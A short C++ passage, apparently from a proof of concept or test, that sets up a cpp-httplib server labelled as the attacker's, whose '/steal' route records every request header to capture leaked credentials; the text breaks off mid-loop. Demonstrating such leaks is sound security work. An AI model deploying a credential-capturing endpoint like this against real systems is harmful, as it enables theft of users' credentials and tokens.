int main() {
  // Attacker's server -- captures leaked credentials
  httplib::Server evil;
  evil.Get("/steal", [&](const httplib::Request &req, httplib::Response &res) {
    captured_headers.clear();
    for (auto &h : req.headers) {
      captured_headers += "  " + h.first + ": " + h.second + "\n";
